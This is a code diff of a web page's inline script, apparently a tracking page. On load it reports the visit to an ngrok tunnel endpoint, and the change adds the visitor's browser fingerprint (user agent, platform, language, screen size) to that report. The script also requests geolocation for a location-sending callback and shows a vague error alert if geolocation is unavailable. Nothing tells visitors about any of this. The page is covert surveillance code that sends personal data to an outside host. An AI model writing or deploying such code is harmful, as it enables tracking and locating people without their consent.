@@ -22,23 +22,43 @@
   </div>
 
   <script>
-    // Envia mensagem de acesso ao servidor
-    fetch("https://e647-2804-d59-8c25-2f00-7a64-3157-cdbd-267f.ngrok-free.app/send-message", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        message: "O site foi acessado."
-      })
-    });
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+  // Função para coletar info do navegador
+  function getBrowserInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: {
+        width: window.screen.width,
+        height: window.screen.height
       }
-    });
+    };
+  }
+
+  // Envia mensagem de acesso ao servidor com infos extras
+  const browserInfo = getBrowserInfo();
+
+  const message = `O site foi acessado.\n
+🖥 Plataforma: ${browserInfo.platform}
+🌐 Navegador: ${browserInfo.userAgent}
+🌎 Idioma: ${browserInfo.language}
+📏 Resolução: ${browserInfo.screen.width}x${browserInfo.screen.height}`;
+
+  fetch("https://e647-2804-d59-8c25-2f00-7a64-3157-cdbd-267f.ngrok-free.app/send-message", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ message })
+  });
+
+  window.addEventListener("load", () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+    } else {
+      alert("Algo deu errado. Tente novamente mais tarde.");
+    }
+  });
 
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
